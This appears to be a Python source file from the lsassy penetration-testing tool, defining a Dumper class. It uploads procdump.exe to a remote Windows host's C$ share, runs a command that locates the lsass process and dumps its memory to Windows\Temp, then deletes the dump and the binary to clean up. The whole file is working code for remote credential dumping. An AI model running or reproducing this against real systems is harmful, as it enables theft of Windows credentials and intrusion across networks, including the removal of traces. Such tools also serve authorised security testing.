import os
from lsassy.log import Logger
import time


class Dumper:
    def __init__(self, connection, args, debug=False):
        self._log = Logger(debug)
        self._tmp_dir = "\\Windows\\Temp\\"
        self._share = "C$"
        self._procdump = "procdump.exe"
        self._procdump_path = "/tmp/"
        self._remote_lsass_dump = "tmp.dmp"
        self._conn = connection
        if args.procdump is not None:
            self._procdump_path = args.procdump

    def dump(self):
        # Verify procdump exists on host
        procdump_full_path = os.path.join(self._procdump_path, self._procdump)
        if not os.path.exists(self._procdump_path):
            self._log.error("{} directory does not exist.".format(self._procdump_path))
            return 1
        elif not os.path.exists(procdump_full_path):
            self._log.error("{} does not exist.".format(procdump_full_path))
            return 1

        # Upload procdump
        self._log.debug('Copy {} to {}'.format(procdump_full_path, self._tmp_dir))
        with open(procdump_full_path, 'rb') as procdump:
            try:
                self._conn.conn.putFile(self._share, self._tmp_dir + self._procdump, procdump.read)
                self._log.debug('Created file {} on the \\\\{}{}'.format(self._procdump, self._share, self._tmp_dir))
            except Exception as e:
                self._log.error('Error writing file to share {}: {}'.format(self._share, e))

        # Dump lsass remotely
        # Dump using lsass PID
        command = """for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {}{} -accepteula -o -ma ^%B {}{}""".format(
            self._tmp_dir, self._procdump, self._tmp_dir, self._remote_lsass_dump)
        self._log.debug('Dumping lsass.exe')
        """
        @TODO Execute command must be defined
        """
        p = self._conn.execute(command, True)
        self._log.debug(p)

        if 'Dump 1 complete' in p:
            # Procdump ended
            self._log.debug('Procdump output fully retrieved')
        elif 'Dump 1 ini' in p:
            # Procdump output not fully retrieved
            self._log.debug('Procdump output partially retrieved')
            # Since we cannot know when the dump finishes, we wait for 5s
            time.sleep(5)
        elif 'The version of this file is not compatible' in p or 'Cette version de' in p:
            self._log.error(
                'Provided procdump executable and target architecture are incompatible (32 bits / 64 bits)'
            )
            exit()
        else:
            self._log.error('Unknown error while dumping lsass, try CME with --verbose to see details')
            exit()

        self._log.success("Process lsass.exe was successfully dumped")
        return (self._share + self._tmp_dir).replace("\\", "/")
    
    def clean(self):
        try:
            self._conn.conn.deleteFile(self._share, self._tmp_dir + self._remote_lsass_dump)
            self._log.success('Deleted lsass dump')
        except Exception as e:
            self._log.error('Error deleting lsass dump : {}'.format(e))

        # Delete procdump.exe
        try:
            self._conn.conn.deleteFile(self._share, self._tmp_dir + self._procdump)
            self._log.success('Deleted procdump.exe')
        except Exception as e:
            self._log.error('Error deleting procdump.exe : {}'.format(e))